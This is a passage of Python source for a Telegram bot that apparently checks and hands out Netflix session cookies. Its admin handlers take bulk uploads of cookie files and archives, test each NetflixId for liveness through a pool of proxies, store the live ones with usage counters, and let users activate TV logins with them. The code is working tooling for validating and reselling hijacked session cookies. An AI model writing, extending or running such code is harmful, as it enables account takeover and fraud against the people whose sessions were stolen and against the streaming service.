    if update.effective_user.id not in ADMIN_IDS:
        await safe_reply(update.message, "⛔ Admins only.")
        return
    all_cookies = get_all_cookies_with_metadata()
    if not all_cookies:
        await safe_reply(update.message, "📭 No cookies stored.")
        return
    lines = ["📋🍪 *STORED COOKIES* 🍪📋\n"]
    for c in all_cookies:
        lines.append(
            f"• `{c['filename']}` → NetflixId: `{c['NetflixId'][:20]}...` (used {c['usage_count']}/{MAX_USAGE_PER_COOKIE})"
        )
    await safe_reply(update.message, "\n".join(lines), parse_mode="Markdown")


async def del_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await safe_reply(update.message, "⛔ Admins only.")
        return
    args = context.args
    if not args:
        await safe_reply(
            update.message, "Usage: `/delcookie NetflixId_value`", parse_mode="Markdown"
        )
        return
    netflix_id = args[0]
    if remove_cookie_by_netflixid_global(netflix_id):
        await safe_reply(
            update.message, f"🗑️✅ Cookie `{netflix_id[:15]}...` removed."
        )
    else:
        await safe_reply(update.message, "❌ Cookie not found or you don't own it.")


# ========== FILE HANDLER WITH AUTO-DETECTION & INSTANT STOP ==========
def process_single_cookie_task(fname: str, content: str, admin_id: int):
    if stop_requested:
        return False, "Stopped"
    netflix_id = extract_netflix_id_from_text(content)
    if not netflix_id:
        return False, "No NetflixId"
    if stop_requested:
        return False, "Stopped"

    is_alive, reason = check_if_cookie_alive(netflix_id)
    if stop_requested:
        return False, "Stopped"

    if is_alive:
        success, msg = add_cookie_with_metadata(admin_id, fname, netflix_id)
        if success:
            return True, "OK"
        return False, "Duplicate"
    return False, reason


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_requested
    user = update.effective_user
    if user.id not in ADMIN_IDS:
        await safe_reply(update.message, "⛔ Only admins can add cookies.")
        return
    document = update.message.document
    if not document:
        return
    file_name = document.file_name.lower()

    if document.file_size > 15 * 1024 * 1024:
        await safe_reply(update.message, "❌ File too large (max 15 MB).")
        return

    status_msg = await safe_reply(update.message, "📥 Downloading and checking file...")
    stop_requested = False

    # Auto-detection for single .txt / .json files
    if file_name.endswith((".txt", ".json")):
        file = await context.bot.get_file(document.file_id)
        file_bytes = await file.download_as_bytearray()
        content = file_bytes.decode("utf-8", errors="ignore")
        netflix_id = extract_netflix_id_from_text(content)

        if not netflix_id:
            await status_msg.edit_text("❌ No valid NetflixId found in the file.")
            return

        is_alive, reason = await asyncio.to_thread(check_if_cookie_alive, netflix_id)
        if not is_alive:
            await status_msg.edit_text(
                f"❌ **Cookie Rejected:** `{reason}`", parse_mode="Markdown"
            )
            return

        success, msg = add_cookie_with_metadata(user.id, document.file_name, netflix_id)
        if success:
            await status_msg.edit_text(
                f"✅ **Alive Cookie Added:** `{document.file_name}`",
                parse_mode="Markdown",
            )
        else:
            await status_msg.edit_text("⚠️ Cookie already exists in storage.")
        return

    # Auto-detection for .zip / .rar files
    if file_name.endswith(".zip") or (RAR_SUPPORT and file_name.endswith(".rar")):
        await status_msg.edit_text("📦 Extracting archive...")
        file = await context.bot.get_file(document.file_id)
        raw_data = await file.download_as_bytearray()

        files_to_process = []
        if file_name.endswith(".zip"):
            with zipfile.ZipFile(io.BytesIO(raw_data)) as zf:
                for fname in zf.namelist():
                    if fname.lower().endswith((".txt", ".json")):
                        content = zf.read(fname).decode("utf-8", errors="ignore")
                        files_to_process.append((fname, content))
        elif RAR_SUPPORT and file_name.endswith(".rar"):
            with rarfile.RarFile(io.BytesIO(raw_data)) as rf:
                for fname in rf.namelist():
                    if fname.lower().endswith((".txt", ".json")):
                        content = rf.read(fname).decode("utf-8", errors="ignore")
                        files_to_process.append((fname, content))

        total_files = len(files_to_process)
        if total_files == 0:
            await status_msg.edit_text("❌ No valid .txt or .json files found in archive.")
            return

        # Pre-Flight Proxy Sanitation Check
        live_proxies = await sanitize_proxy_pool(status_msg)
        if live_proxies == 0:
            await status_msg.edit_text(
                "⚠️ **No Live Proxies Available!**\n\n"
                "All stored proxies failed connection tests or none were added.\n"
                "Please add working proxies using `/addproxy user:pass:host:port` and re-upload your archive.",
                parse_mode="Markdown",
            )
            return

        added, dead, dupes = 0, 0, 0
        processed = 0
        last_edit_time = time.time()

        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = [
                executor.submit(process_single_cookie_task, fname, content, user.id)
                for fname, content in files_to_process
            ]
            for future in futures:
                if stop_requested:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break

                ok, res = future.result()
                processed += 1
                if ok:
                    added += 1
                elif res == "Duplicate":
                    dupes += 1
                elif res == "Stopped":
                    break
                else:
                    dead += 1

                current_time = time.time()
                if (current_time - last_edit_time >= 1.5) or (processed == total_files):
                    try:
                        await status_msg.edit_text(
                            f"⏳ **Checking Cookies:** `{processed}/{total_files}`\n\n"
                            f"🟢 **Alive:** `{added}` | 🔴 **Dead:** `{dead}` | ⚠️ **Dupes:** `{dupes}`\n\n"
                            f"🛑 Send /stop to cancel.",
                            parse_mode="Markdown"
                        )
                        last_edit_time = current_time
                    except Exception:
                        pass

        status_prefix = "🛑 **Bulk Upload Stopped!**" if stop_requested else "✅ **Bulk Upload Finished!**"
        await status_msg.edit_text(
            f"{status_prefix}\n\n"
            f"🟢 **Alive Added:** `{added}`\n"
            f"🔴 **Rejected/Dead:** `{dead}`\n"
            f"⚠️ **Duplicates:** `{dupes}`",
            parse_mode="Markdown",
        )
        return

    await status_msg.edit_text("❌ Unsupported file format. Please upload a .txt, .json, .zip, or .rar file.")


# ========== SET COMMANDS ==========
async def set_commands(app: Application):
    default_commands = [
        BotCommand("start", "Welcome"),
        BotCommand("login", "Activate TV code"),
        BotCommand("panel", "Your login stats"),
        BotCommand("channels", "Show approved channels"),
    ]
    await app.bot.set_my_commands(default_commands)
    admin_commands = default_commands + [
        BotCommand("addproxy", "Add proxy (user:pass:host:port)"),
        BotCommand("listproxies", "Show active proxies count"),
        BotCommand("clearproxies", "Delete all proxies from database"),
        BotCommand("recheck", "Recheck DB & broadcast notice"),
        BotCommand("stop", "Stop active bulk checking"),
        BotCommand("listcookies", "Show all cookies"),
        BotCommand("delcookie", "Delete a cookie"),
        BotCommand("delall", "Delete all cookies"),
    ]
    for admin_id in ADMIN_IDS:
        try:
            await app.bot.set_my_commands(
                admin_commands, scope=BotCommandScopeChat(chat_id=admin_id)
            )
        except Exception as e:
            logger.warning(f"Could not set commands for admin {admin_id}: {e}")


# ========== MAIN ==========
def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_NEW_BOT_TOKEN_HERE":
        print("❌ Please update BOT_TOKEN with a valid key in tv.py.")
        return
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("login", login_command))
    app.add_handler(CommandHandler("panel", panel_command))
    app.add_handler(CommandHandler("channels", channels_command))
    app.add_handler(CommandHandler("addproxy", addproxy_command))
    app.add_handler(CommandHandler("listproxies", listproxies_command))
    app.add_handler(CommandHandler("clearproxies", clearproxies_command))
    app.add_handler(CommandHandler("recheck", recheck_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("delall", delall_command))
    app.add_handler(CommandHandler("delall_confirm", delall_confirm))
    app.add_handler(CommandHandler("listcookies", list_cookies))
    app.add_handler(CommandHandler("delcookie", del_cookie))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.post_init = set_commands
    print(
        "✅ Bot running – web server active on port 8000, connected to MongoDB."
    )
    app.run_polling()


if __name__ == "__main__":
    main()
